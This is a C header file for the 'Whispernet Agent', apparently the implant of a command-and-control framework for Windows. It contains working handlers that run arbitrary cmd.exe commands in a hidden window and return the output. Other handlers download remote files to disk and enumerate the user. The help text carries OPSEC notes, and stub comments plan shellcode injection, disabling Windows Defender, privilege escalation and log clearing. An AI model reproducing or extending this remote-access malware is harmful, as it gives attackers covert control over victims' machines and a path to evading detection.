#pragma once

#include <stdio.h>
#include <windows.h>
#include "type_conversions.h"
#include "whisper_config.h"
#include "whisper_json.h"
#include "whisper_winapi.h"
#include "whisper_dynamic_config.h"


/*
    Baked in commands to Whispernet Agent

    uses things like whisper_winapi to do actions here


    may need to split into .c and .h as well
*/
void set_response_data(OutboundJsonDataStruct* response_struct, const char* data);

void get_username(OutboundJsonDataStruct* response_struct);
int parse_command(char* command, char* args, OutboundJsonDataStruct*);
void shell(OutboundJsonDataStruct*, char* args);
void get_file_http(OutboundJsonDataStruct*, char* args);
void messagebox(OutboundJsonDataStruct*, char* args);
void sleep(OutboundJsonDataStruct*, char* args);
void help(OutboundJsonDataStruct*);

//filesystem stuff
void mkdir(OutboundJsonDataStruct* response_struct, char* args);
void rmdir(OutboundJsonDataStruct* response_struct, char* args);
void cd(OutboundJsonDataStruct* response_struct, char* args);
void pwd(OutboundJsonDataStruct* response_struct);

// ====================
// Functions
// ====================

// later - have a seperate parse tree based on if creds are supplied or not, or
// somethign like that...
int parse_command(char* command, char* args, OutboundJsonDataStruct* response_struct)
{
    if (!response_struct) {
        DEBUG_LOG("[!] response_struct is NULL!\n");
        return -1; // Error case
    }

    DEBUG_LOG("Struct UUID: %s\n",
        response_struct->agent_id); // Correct: Use -> for pointers
    DEBUG_LOG("Struct command_result_data: %s\n", response_struct->command_result_data);

    // cant use switch cuz char * is not a single value (intergral type)

    if (strcmp(command, "whoami") == 0) {
        DEBUG_LOG("[COMMAND] whoami\n");
        get_username(response_struct);
    } 
    else if (strcmp(command, "shell") == 0) {
        DEBUG_LOG("[COMMAND] shell\n");
        shell(response_struct, args);
    } 
    else if (strcmp(command, "get_http") == 0) {
        DEBUG_LOG("[COMMAND] get_http...\n");
        get_file_http(response_struct, args);
    } 
    else if (strcmp(command, "messagebox") == 0) {
        DEBUG_LOG("[COMMAND] get_http...\n");
        messagebox(response_struct, args);
    } 
    else if (strcmp(command, "help") == 0) {
        DEBUG_LOG("[COMMAND] help...\n");
        help(response_struct);
    } 
    else if (strcmp(command, "sleep") == 0) {
        DEBUG_LOG("[COMMAND] sleep\n");
        sleep(response_struct, args);
    } 
    else if (strcmp(command, "mkdir") == 0) {
        DEBUG_LOG("[COMMAND] mkdir\n");
        mkdir(response_struct, args);
    }
    else if (strcmp(command, "cd") == 0) {
        DEBUG_LOG("[COMMAND] cd\n");
        cd(response_struct, args);
    }
    else if (strcmp(command, "rmdir") == 0) {
        DEBUG_LOG("[COMMAND] rmdir\n");
        rmdir(response_struct, args);
    }
    else if (strcmp(command, "pwd") == 0) {
        DEBUG_LOG("[COMMAND] pwd\n");
        pwd(response_struct);
    }
    else {
        DEBUG_LOG("[COMMAND] Unknown command!\n");
        set_response_data(response_struct, "Unknown command");
    }
    return 0;
}
// ====================
// Helper funcs
// ====================

/**
 * @brief Allocates and sets the command_result_data field in the response struct.
 *
 * This function dynamically allocates memory and copies the given string (`data`)
 * into the `command_result_data` field of `response_struct`. If memory was already
 * allocated for `command_result_data`, it is freed before assigning the new value.
 *
 * @param response_struct Pointer to the OutboundJsonDataStruct where data should be stored.
 * @param data The string to be copied into response_struct->command_result_data.
 *
 * @note The caller is responsible for ensuring response_struct is a valid, allocated pointer.
 * @note The caller must free response_struct->command_result_data before deallocating response_struct.
 * @note This function uses `_strdup`, which internally calls `malloc`. If memory allocation fails,
 *       `command_result_data` remains NULL and a debug log is printed.
 *
 * @example
 * ```c
 * OutboundJsonDataStruct* response = (OutboundJsonDataStruct*)calloc(1, sizeof(OutboundJsonDataStruct));
 * if (!response) {
 *     printf("Memory allocation failed for response_struct.\n");
 *     return 1;
 * }
 * 
 * set_response_data(response, "Operation successful");
 * printf("Response: %s\n", response->command_result_data);
 * 
 * // Cleanup
 * free(response->command_result_data);
 * free(response);
 * ```
 */
void set_response_data(OutboundJsonDataStruct* response_struct, const char* data) {
    if (response_struct->command_result_data) {
        free(response_struct->command_result_data);
    }
    
    response_struct->command_result_data = _strdup(data); // _strdup dynamically allocates and copies the string
    if (!response_struct->command_result_data) {
        DEBUG_LOG("Memory allocation failed for command_result_data.\n");
    }
}


// ====================
// Commands
// ====================

void get_username(OutboundJsonDataStruct* response_struct) {
    /*
        Retrieves the current user's name.

        Uses the WhisperGetUserNameW wrapper function.  Converts the
        retrieved username from WCHAR (wide characters) to UTF-8 for
        compatibility with the JSON response.
    */
    WCHAR username[256];
    DWORD size = 256;

    if (WhisperGetUserNameW(username, &size)) {
        DEBUG_LOGW(L"Current User: %s\n", username);

        char* utf8_username = wchar_to_utf8(username);
        if (utf8_username) {
            free(response_struct->command_result_data); // Free previous data
            set_response_data(response_struct, utf8_username);
            free(utf8_username); // Free allocated UTF-8 string to prevent memory leak
        } else {
            DEBUG_LOG("wchar_to_utf8 failed.\n");
            set_response_data(response_struct, "Error converting username to UTF-8");
        }
    } else {
        DWORD error = GetLastError();
        DEBUG_LOGW(L"Failed to get username. Error: %lu\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
    }
}


void shell(OutboundJsonDataStruct* response_struct, char* args) {
    /*
        Executes a shell command using cmd.exe.

        This function creates a child process running cmd.exe with the given
        command.  It captures the output of the command via pipes and sends it
        back to the client. 
    */

    SECURITY_ATTRIBUTES sa;
    HANDLE hRead, hWrite;
    PROCESS_INFORMATION pi;
    STARTUPINFO si;
    char buffer[PIPE_READ_SIZE_BUFFER]; // More descriptive name
    DWORD bytesRead;
    BOOL success;

    // Security attributes for pipe handles
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;

    // Create pipe
    if (!WhisperCreatePipe(&hRead, &hWrite, &sa, 0)) {
        DWORD error = GetLastError();
        DEBUG_LOGF(stderr, "CreatePipe failed (%lu)\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);
        return; // Important: Return on error
    }
    WhisperSetHandleInformation(hRead, HANDLE_FLAG_INHERIT, 0);

    // Create child process
    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si);
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.dwFlags |= CREATE_NO_WINDOW; // Hides the console window

    char cmdLine[CLI_INPUT_SIZE_BUFFER];
    snprintf(cmdLine, sizeof(cmdLine), "cmd.exe /C \"%s\"", args);

    ZeroMemory(&pi, sizeof(pi));
    success = WhisperCreateProcessA(NULL, cmdLine, NULL, NULL, TRUE, 0, NULL, PROCESS_SPAWN_DIRECTORY, &si, &pi);

    if (!success) {
        DWORD error = GetLastError();
        DEBUG_LOGF(stderr, "[!] CreateProcess failed (%lu)\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message);

        WhisperCloseHandle(hWrite);
        WhisperCloseHandle(hRead);
        return; // Important: Return on error
    }

    WhisperWaitForSingleObject(pi.hProcess, INFINITE);
    WhisperCloseHandle(hWrite);

    // Read pipe
    char output_buffer[PIPE_READ_SIZE_BUFFER] = ""; // Initialize an empty string
    DWORD totalBytesRead = 0;

    while (TRUE) {
        success = WhisperReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL);
        if (!success || bytesRead == 0) {
            break;
        }

        buffer[bytesRead] = '\0';
        DEBUG_LOG("%s", buffer);

        // Append to the output buffer (handle potential buffer overflow)
        size_t available = sizeof(output_buffer) - strlen(output_buffer) - 1;
        size_t to_copy = min(available, (size_t)bytesRead); // Safe copy
        strncat(output_buffer, buffer, to_copy);
        totalBytesRead += bytesRead;
    }

    // Generate response
    free(response_struct->command_result_data);
    set_response_data(response_struct, output_buffer); // Send accumulated output

    // Cleanup
    WhisperCloseHandle(pi.hProcess);
    WhisperCloseHandle(pi.hThread);
    WhisperCloseHandle(hRead);
}


void messagebox(OutboundJsonDataStruct* response_struct, char* args) {
    /*
        Displays a message box.

        Takes a title and a message as arguments.  Uses the WhisperMessageBoxA
        wrapper function to display the message box.
    */
    char* context = NULL;
    char* title = strtok_s(args, " ", &context);
    char* message = strtok_s(NULL, " ", &context);

    if (!title || !message) {
        DEBUG_LOG("[ERROR] messagebox: Expected: <title> <message>\n");
        set_response_data(response_struct, "Invalid arguments. Expected: <title> <message>");
        return;
    }

    WhisperMessageBoxA(NULL, message, title, MB_OK | MB_ICONINFORMATION);
    set_response_data(response_struct, "Message box displayed successfully");
}

void get_file_http(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* url = strtok_s(args, " ", &context);
    char* file_path = strtok_s(NULL, " ", &context);

    if (!url || !file_path) {
        DEBUG_LOG("[ERROR] get_file_http: Expected: <URL> <FilePath>\n");
        set_response_data(response_struct, "Invalid arguments. Expected: <URL> <FilePath>");
        return;
    }

    DEBUG_LOG("URL: %s\n", url);
    DEBUG_LOG("File Path: %s\n", file_path);

    int result = download_file(url, file_path);

    if (result == 0) {
        set_response_data(response_struct, "File downloaded successfully");
    } else {
        // Retrieve the formatted error message from download_file (if available)
        char error_message[512] = "File download failed: ";

        // It is better to have download_file return the actual error message
        // instead of just an error code. Then you can do:
        // strncat(error_message, returned_error_message, sizeof(error_message) - strlen(error_message) - 1);

        // For now, if download_file doesn't return the message, we'll have to rely on a generic one
        if (strlen(error_message) <= 20) { // Check if it's still the base message
            strncat(error_message, "Check the logs for more details.", sizeof(error_message) - strlen(error_message) - 1);
        }

        set_response_data(response_struct, error_message);
    }
}


// Keep
void sleep(OutboundJsonDataStruct* response_struct, char* args) {
    /*
        Sets the sleep time for the agent.

        Takes an integer argument representing the sleep time in seconds.
        Uses strtol for safer integer parsing.
    */
    char* context = NULL;
    char* sleep_arg = strtok_s(args, " ", &context);

    if (!sleep_arg) {
        DEBUG_LOG("[ERROR] sleep: Expected: <int: sleeptime (seconds)>\n");
        set_response_data(response_struct, "Missing sleep time argument");
        return;
    }

    char* endptr; // For error checking with strtol
    long sleep_seconds = strtol(sleep_arg, &endptr, 10); // Parse as long int

    // Error checking for strtol
    if (*endptr != '\0' || sleep_seconds < 0) { // Check for non-numeric input and negative values
        DEBUG_LOG("[ERROR] sleep: Invalid sleep time. Must be a non-negative integer.\n");
        set_response_data(response_struct, "Invalid sleep time. Must be a non-negative integer.");
        return;
    }

    // Convert to DWORD (handle potential overflow)
    DWORD dwTime;
    if (sleep_seconds > MAXDWORD / 1000) { // Check for potential overflow if time is in seconds
        DEBUG_LOG("[ERROR] sleep: Sleep time too large.\n");
        set_response_data(response_struct, "Sleep time too large.");
        return;
    }
    dwTime = (DWORD)(sleep_seconds * 1000); // Convert to milliseconds

    set_sleep_time(dwTime);
    char message[256];
    snprintf(message, sizeof(message), "Sleep time set to %ld seconds", sleep_seconds); //response message
    set_response_data(response_struct, message);
    return;
}

// Keep
void help(OutboundJsonDataStruct* response_struct) {
    const char* help_string = "Help:\n\
> File System Commands:\n\
    mkdir: (mkdir <str: directory>): Creates a new directory.\n\
    rmdir: (rmdir <str: directory>): Removes a directory.\n\
    cd: (cd <str: directory>): Changes the current directory.\n\
    pwd: (pwd): Prints the current working directory.\n\
> Loud Commands\n\
	http_get: (http_get <str: url> <str: filepath>): Get an HTTP file, and save at the <filpath>\n\
		[ OPSEC: Will write file to disk ]\n\
	shell: (shell <str: command>): Run a command via cmd.exe\n\
		[ OPSEC: Runs a new cmd.exe process ]\n\
	messagebox: (messagebox <str: title> <str: message>): Pop a messagebox with a message\n\
		[ OPSEC: Shows on users screen ]\n\
> Config Commands:\n\
    sleep: (sleep <int: sleeptime (seconds)): How long to sleep for/update sleep time\n\
";

    set_response_data(response_struct, help_string);
}

/*
Directory Commands

Need to switch to WhisperFunctions

Still need some work

*/



/* 
    Create a directory 
*/
void mkdir(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path_arg = strtok_s(args, " ", &context);

    if (path_arg == NULL) {
        set_response_data(response_struct, "Missing directory path argument");
        return;
    }

    if (CreateDirectoryA(path_arg, NULL)) {
        DEBUG_LOG("Directory created: %s\n", path_arg);
        set_response_data(response_struct, "Directory created");
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("CreateDirectory failed. Error: %lu\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/* 
    Remove a directory 
*/
void rmdir(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path_arg = strtok_s(args, " ", &context);

    if (path_arg == NULL) {
        set_response_data(response_struct, "Missing directory path argument");
        return;
    }

    if (RemoveDirectoryA(path_arg)) {
        DEBUG_LOG("Directory removed: %s\n", path_arg);
        set_response_data(response_struct, "Directory removed");
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("RemoveDirectory failed. Error: %lu\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/* 
    Change directory 
*/
void cd(OutboundJsonDataStruct* response_struct, char* args) {
    char* context = NULL;
    char* path_arg = strtok_s(args, " ", &context);

     if (path_arg == NULL) {
        set_response_data(response_struct, "Missing directory path argument");
        return;
    }

    if (SetCurrentDirectoryA(path_arg)) {
        DEBUG_LOG("Changed directory to: %s\n", path_arg);
        char cwd[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, cwd); // Get the actual current directory
        set_response_data(response_struct, cwd); // Respond with the full current directory
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("SetCurrentDirectory failed. Error: %lu\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/* 
    Get current working directory 
*/
void pwd(OutboundJsonDataStruct* response_struct) {
    char cwd[MAX_PATH];
    if (GetCurrentDirectoryA(MAX_PATH, cwd)) {
        DEBUG_LOG("Current working directory: %s\n", cwd);
        set_response_data(response_struct, cwd);
    } else {
        DWORD error = GetLastError();
        DEBUG_LOG("GetCurrentDirectory failed. Error: %lu\n", error);
        char error_message[256];
        FormatMessageA(FORMAT_MESSAGE_FROM_SYSTEM, NULL, error, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT), error_message, sizeof(error_message), NULL);
        set_response_data(response_struct, error_message); // Include error message in response
    }
}

/*
 Stub commands for things that can to be added for more functionality

*/

// File Operations
// void write_file(response_struct, path, contents) - Write contents to a file
// void read_file(response_struct, path) - Read contents of a file
// void delete_file(response_struct, path) - Delete a file
// void append_file(response_struct, path, contents) - Append data to an existing file
// void rename_file(response_struct, old_path, new_path) - Rename or move a file
// void copy_file(response_struct, src, dest) - Copy a file from one location to another
// void download_file(response_struct, url, dest) - Download a file from a URL
// void upload_file(response_struct, src, dest) - Upload a file to the C2
// void search_file(response_struct, dir, pattern) - Search for files matching a wildcard pattern

// Directory Operations
// [X] void mkdir(response_struct, path) - Create a directory
// [X] void rmdir(response_struct, path) - Remove a directory
// [X] void cd(response_struct, path) - Change directory
// [X] void pwd(response_struct) - Get current working directory
// void ls(response_struct, path) - List files in a directory

// Process and Execution
// void start_process(response_struct, command) - Start a new process
// void kill_process(response_struct, pid) - Kill a process by PID
// void suspend_process(response_struct, pid) - Suspend a process
// void resume_process(response_struct, pid) - Resume a suspended process
// void shell(response_struct, command) - Execute a shell command and return output

// System Information
// void get_username(response_struct) - Get the current username
// void get_system_info(response_struct) - Retrieve system information
// void get_os_version(response_struct) - Get OS version details
// void get_ip(response_struct) - Retrieve the system’s IP address
// void get_env_vars(response_struct) - Get a list of environment variables

// Network Operations
// void get_file_http(response_struct, url) - Fetch a file over HTTP
// void upload_file_http(response_struct, src, url) - Upload a file via HTTP POST
// void ping(response_struct, target) - Send a ping to a target host
// void port_scan(response_struct, target, start_port, end_port) - Scan open ports on a target

// C2 Interaction
// void sleep(response_struct, seconds) - Pause execution for a given time
// void checkin(response_struct) - Send a beacon/check-in message to C2
// void change_c2_server(response_struct, new_address) - Update the C2 server address

// Stealth & Evasion
// void inject_shellcode(response_struct, pid, shellcode) - Inject shellcode into a process
// void hide_process(response_struct, pid) - Attempt to hide a running process
// void disable_defender(response_struct) - Try to disable Windows Defender
// void elevate_privileges(response_struct) - Attempt to escalate privileges
// void clear_logs(response_struct) - Clear system logs for stealth
// void disable_event_logging(response_struct) - Disable Windows event logging


